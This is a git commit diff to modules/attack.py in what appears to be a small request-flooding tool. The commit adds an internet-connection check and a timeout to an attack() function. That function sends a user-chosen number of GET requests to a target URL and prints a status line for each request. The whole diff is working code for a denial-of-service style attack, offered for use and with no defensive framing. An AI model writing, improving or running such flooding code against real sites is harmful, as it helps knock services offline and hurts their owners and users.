08a612e26ca6011f1ea2fecd03f26cfa81280816
MohammadHossein <mohammadhossein.dev@gmail.com>
2022-02-17 20:26:43 +0330

    Added the ability to handle if there isn't any internet connection

--- modules/attack.py
+++ modules/attack.py
@@ -1,31 +1,39 @@
 import requests
+import socket
 from colorama import Fore
 from modules import user_input
 
+def check_internet_connection():
+    try:
+        host = socket.gethostbyname("www.google.com")
+        s = socket.create_connection((host, 80), 2)
+        return True
+    except:
+        pass
+    return False
 
 def attack():
-    print()
-    print(Fore.LIGHTBLUE_EX + "Starting attack to " + Fore.GREEN + user_input.target_url + Fore.LIGHTBLUE_EX + " with " + Fore.GREEN + str(user_input.requests_count) + Fore.LIGHTBLUE_EX + " requests :"+Fore.RESET)
+    if check_internet_connection():
+        print()
+        print(Fore.LIGHTBLUE_EX + "Starting attack to " + Fore.GREEN + user_input.target_url + Fore.LIGHTBLUE_EX + " with " + Fore.GREEN + str(user_input.requests_count) + Fore.LIGHTBLUE_EX + " requests :"+Fore.RESET)
 
-    for i in range(1, user_input.requests_count+1):
+        for i in range(1, user_input.requests_count+1):
 
-        try:
-            req = requests.get(user_input.target_url)
+            try:
+                req = requests.get(user_input.target_url, timeout=10)
+                if req.status_code == 200:
+                    print(Fore.GREEN + "[*] Request " + Fore.BLUE + str(i) + Fore.GREEN + " successfully sent to the target" + Fore.RESET)
+                elif req.status_code == 404:
+                    print(Fore.LIGHTRED_EX + "[*] Request " + Fore.BLUE + str(i) + Fore.LIGHTRED_EX + " sent to the target, but got a 404 Not Found error, maybe the URL is wrong or deleted or moved to another one" + Fore.RESET)
+                elif str(req.status_code).startswith("3"):
+                    print(Fore.YELLOW + "[*] Request " + Fore.BLUE + str(i) + Fore.YELLOW + " sent to the target, but got a 3xx code, maybe there was a redirection" + Fore.RESET)
+                else:
+                    print(Fore.RED + "[*] The request couldn't be sent, there was a problem with your network or maybe the problem was from the server, if it repeated check everything then try again" + Fore.RESET)
 
-            if req.status_code == 200:
-                print(Fore.GREEN + "[*] Request " + Fore.BLUE + str(i) + Fore.GREEN + " successfully sent to the target" + Fore.RESET)
-            elif req.status_code == 404:
-                print(Fore.LIGHTRED_EX + "[*] Request " + Fore.BLUE + str(i) + Fore.LIGHTRED_EX + " sent to the target, but got a 404 Not Found error, maybe the URL is wrong or deleted or moved to another one" + Fore.RESET)
-            elif str(req.status_code).startswith("3"):
-                print(Fore.YELLOW + "[*] Request " + Fore.BLUE + str(i) + Fore.YELLOW + " sent to the target, but got a 3xx code, maybe there was a redirection" + Fore.RESET)
-            else:
+
+
+            except:
                 print(Fore.RED + "[*] The request couldn't be sent, there was a problem with your network or maybe the problem was from the server, if it repeated check everything then try again" + Fore.RESET)
 
-        except ConnectionResetError:
-            print(Fore.RED + "[*] The request couldn't be sent, The connection reset" + Fore.RESET)
-        except ConnectionRefusedError:
-            print(Fore.RED + "[*] The request couldn't be sent, Server refused the connection" + Fore.RESET)
-        except ConnectionAbortedError:
-            print(Fore.RED + "[*] The request couldn't be sent, Server aborted the connection" + Fore.RESET)
-        except ConnectionError:
-            print(Fore.RED+"[*] The request couldn't be sent, there was a problem with your network or maybe the problem was from the server, if it repeated check everything then try again"+Fore.RESET)
+    else:
+        print((Fore.RED + "[*] Please check your internet connection, It seems you don't have access to internet"))
